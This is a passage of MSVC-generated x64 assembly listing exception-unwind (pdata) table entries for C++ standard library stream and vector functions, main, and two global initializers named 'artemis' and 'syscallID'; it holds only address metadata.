$pdata$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ DD imagerel $LN11
	DD	imagerel $LN11+207
	DD	imagerel $unwind$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA DD imagerel ?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA
	DD	imagerel ?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA+27
	DD	imagerel $unwind$?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ DD imagerel $LN13
	DD	imagerel $LN13+187
	DD	imagerel $unwind$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA DD imagerel ?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
	DD	imagerel ?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA DD imagerel ?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
	DD	imagerel ?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA+65
	DD	imagerel $unwind$?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z DD imagerel $LN29
	DD	imagerel $LN29+1157
	DD	imagerel $unwind$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD imagerel ?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
	DD	imagerel ?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD imagerel ?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
	DD	imagerel ?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA+27
	DD	imagerel $unwind$?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA DD imagerel ?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
	DD	imagerel ?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA+71
	DD	imagerel $unwind$?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+34
	DD	imagerel $unwind$?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+128
	DD	imagerel $unwind$?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+40
	DD	imagerel $unwind$??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z DD imagerel $LN5
	DD	imagerel $LN5+144
	DD	imagerel $unwind$?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z DD imagerel $LN4
	DD	imagerel $LN4+240
	DD	imagerel $unwind$?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+200
	DD	imagerel $unwind$?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ DD imagerel $LN3
	DD	imagerel $LN3+21
	DD	imagerel $unwind$?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@E@std@@QEAAPEAE_K@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$?allocate@?$allocator@E@std@@QEAAPEAE_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+34
	DD	imagerel $unwind$?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z DD imagerel $LN5
	DD	imagerel $LN5+144
	DD	imagerel $unwind$?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z DD imagerel $LN4
	DD	imagerel $LN4+240
	DD	imagerel $unwind$?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+200
	DD	imagerel $unwind$?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ DD imagerel $LN3
	DD	imagerel $LN3+21
	DD	imagerel $unwind$?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+34
	DD	imagerel $unwind$?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z DD imagerel $LN5
	DD	imagerel $LN5+144
	DD	imagerel $unwind$?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z DD imagerel $LN4
	DD	imagerel $LN4+239
	DD	imagerel $unwind$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+203
	DD	imagerel $unwind$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ DD imagerel $LN3
	DD	imagerel $LN3+21
	DD	imagerel $unwind$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD imagerel $LN6
	DD	imagerel $LN6+193
	DD	imagerel $unwind$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA DD imagerel ?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA
	DD	imagerel ?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Eartemis@@YAXXZ DD imagerel ??__Eartemis@@YAXXZ
	DD	imagerel ??__Eartemis@@YAXXZ+33
	DD	imagerel $unwind$??__Eartemis@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fartemis@@YAXXZ DD imagerel ??__Fartemis@@YAXXZ
	DD	imagerel ??__Fartemis@@YAXXZ+21
	DD	imagerel $unwind$??__Fartemis@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__EsyscallID@@YAXXZ DD imagerel ??__EsyscallID@@YAXXZ
	DD	imagerel ??__EsyscallID@@YAXXZ+64
	DD	imagerel $unwind$??__EsyscallID@@YAXXZ
pdata	ENDS
pdata	SEGMENT
$pdata$main DD	imagerel $LN9
	DD	imagerel $LN9+565
	DD	imagerel $unwind$main
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z DD imagerel $LN5
	DD	imagerel $LN5+83
	DD	imagerel $unwind$?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z DD imagerel $LN4
	DD	imagerel $LN4+90
	DD	imagerel $unwind$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA DD imagerel ?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA
	DD	imagerel ?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DD imagerel $LN11
	DD	imagerel $LN11+207
	DD	imagerel $unwind$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA DD imagerel ?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA
	DD	imagerel ?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA+27
	DD	imagerel $unwind$?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z DD imagerel $LN3
	DD	imagerel $LN3+28
	DD	imagerel $unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DD imagerel $LN13
	DD	imagerel $LN13+466
	DD	imagerel $unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
	DD	imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
	DD	imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
	DD	imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA+71
	DD	imagerel $unwind$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DD imagerel $LN13
	DD	imagerel $LN13+469
	DD	imagerel $unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
	DD	imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
	DD	imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
